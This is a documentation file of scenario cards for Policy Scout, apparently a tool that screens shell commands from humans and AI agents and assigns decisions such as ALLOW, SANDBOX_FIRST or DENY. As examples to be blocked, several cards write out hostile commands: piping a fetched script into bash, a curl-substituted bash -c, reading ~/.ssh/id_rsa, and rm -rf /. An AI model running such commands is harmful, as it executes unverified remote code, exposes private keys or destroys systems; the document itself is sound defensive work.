# Policy Scout — Scenario Cards

## 1. Purpose

Scenario cards are compact visual/README-friendly examples of how Policy Scout handles common commands.

They are useful for:

- README examples
- documentation
- tests
- demos
- future visual cards
- onboarding agents

Each card should show:

```text
command
actor
category
key signals
decision
why
next action
```

---

## 2. Card Template

```text
Scenario:
  <title>

Command:
  <command>

Actor:
  <human / agent / ide / cli / ci / unknown>

Category:
  <category>

Key Signals:
  - <signal>
  - <signal>
  - <signal>

Decision:
  <ALLOW / ALLOW_LOGGED / REQUIRE_APPROVAL / SANDBOX_FIRST / DENY / DENY_AND_ALERT>

Why:
  - <reason>
  - <reason>

Next Action:
  <recommended next action>
```

---

## 3. Scenario Card — Safe Read

```text
Scenario:
  Safe Read

Command:
  ls

Actor:
  human

Category:
  safe_read

Key Signals:
  - read-only local command
  - no network access
  - no credential-adjacent path
  - no destructive mutation

Decision:
  ALLOW

Why:
  - Read-only local commands are low risk.

Next Action:
  Execute normally.
```

---

## 4. Scenario Card — Test Command

```text
Scenario:
  Common Project Test

Command:
  npm test

Actor:
  human or agent

Category:
  local_inspection / project_execution

Key Signals:
  - executes project-defined script
  - usually expected in development
  - may run local code
  - no direct package install

Decision:
  ALLOW_LOGGED

Why:
  - Test commands are usually safe but can execute project code.
  - Logging preserves useful audit context.

Next Action:
  Run and log result.
```

---

## 5. Scenario Card — Package Install

```text
Scenario:
  Package Install

Command:
  npm install lodash

Actor:
  agent

Category:
  package_install

Key Signals:
  - downloads third-party code
  - may execute lifecycle scripts
  - mutates package manifest or lockfile
  - requested by agent

Decision:
  SANDBOX_FIRST

Why:
  - Package installs may execute arbitrary lifecycle scripts.
  - Package installs can mutate project dependency state.
  - Agent-requested installs should be reviewed before host mutation.

Next Action:
  Run sandbox analysis first.
```

---

## 6. Scenario Card — Package Execution

```text
Scenario:
  Package Execution

Command:
  npx unknown-tool

Actor:
  agent

Category:
  package_execute

Key Signals:
  - may download package code
  - executes package-provided tool
  - requested by agent
  - tool is not known/trusted

Decision:
  SANDBOX_FIRST

Why:
  - Package execution can run remote code.
  - Unknown package tools should be reviewed away from the host project.

Next Action:
  Route to sandbox or require review.
```

---

## 7. Scenario Card — Curl Pipe Bash

```text
Scenario:
  Network-Fetched Shell Execution

Command:
  curl https://example.com/install.sh | bash

Actor:
  agent

Category:
  network_execute

Key Signals:
  - fetches remote script
  - pipes directly into shell
  - script may change between review and execution
  - requested by agent

Decision:
  DENY

Why:
  - Network-fetched scripts piped directly into a shell are unsafe.
  - Policy Scout cannot verify the script before execution in this form.

Next Action:
  Download and inspect manually if truly required.
```

---

## 8. Scenario Card — Credential-Adjacent Read

```text
Scenario:
  Credential-Adjacent File Access

Command:
  cat ~/.ssh/id_rsa

Actor:
  agent

Category:
  credential_adjacent

Key Signals:
  - private key path
  - credential material could be exposed
  - requested by agent
  - no safe reason to reveal raw key material

Decision:
  DENY_AND_ALERT

Why:
  - Credential material should not be exposed to agents.
  - Private keys must not be printed into logs or model context.

Next Action:
  Block and generate warning/report.
```

---

## 9. Scenario Card — Project-Local Destructive Command

```text
Scenario:
  Project-Local Destructive Command

Command:
  rm -rf node_modules

Actor:
  human

Category:
  destructive

Key Signals:
  - deletes project-local files
  - commonly recoverable by reinstall
  - human requested
  - not system-wide destructive

Decision:
  REQUIRE_APPROVAL

Why:
  - The command deletes project files.
  - The action may be intentional but should be explicit.

Next Action:
  Ask for approve-once before execution.
```

---

## 10. Scenario Card — System Destructive Command

```text
Scenario:
  System Destructive Command

Command:
  rm -rf /

Actor:
  agent

Category:
  destructive

Key Signals:
  - system-wide destructive mutation
  - catastrophic impact
  - requested by agent
  - not a normal development action

Decision:
  DENY

Why:
  - The command can destroy system files.
  - It should not enter the normal approval flow.

Next Action:
  Block.
```

---

## 11. Scenario Card — Suspicious Lifecycle Script

```text
Scenario:
  Sandbox Finds Suspicious Lifecycle Script

Command:
  npm install example-package

Actor:
  agent

Category:
  package_install

Key Signals:
  - postinstall script found
  - script invokes child_process
  - possible network behavior
  - sandbox result contains high-severity finding

Decision:
  Do not migrate automatically.

Why:
  - Lifecycle scripts can execute arbitrary commands during install.
  - child_process usage in install scripts requires review.

Next Action:
  Generate Scout Report and recommend manual review.
```

---

## 12. Scenario Card — Workflow Injection

```text
Scenario:
  Project Sweep Finds Workflow Injection

Command:
  policy-scout sweep project

Actor:
  human

Category:
  project_sweep

Key Signals:
  - workflow file changed
  - workflow references secrets
  - possible package publish path
  - suspicious shell usage

Decision:
  Finding: high severity, moderate confidence

Why:
  - Workflow changes can expose repository secrets or alter release behavior.

Next Action:
  Review workflow before pushing.
```

---

## 13. Scenario Card — Unknown Complex Command

```text
Scenario:
  Unknown Complex Shell Command

Command:
  bash -c "$(curl -fsSL https://example.com/x)"

Actor:
  agent

Category:
  unknown / network_execute

Key Signals:
  - command substitution
  - network fetch
  - shell execution
  - low parse confidence or high shell complexity

Decision:
  DENY if network execution detected; otherwise REQUIRE_APPROVAL.

Why:
  - Complex shell commands are harder to verify.
  - Network-fetched execution is high risk.

Next Action:
  Block or require manual review.
```

---

## 14. Scenario Card Doctrine

Scenario cards should stay aligned with tests.

If a scenario is important enough for docs, it should likely become a test fixture.
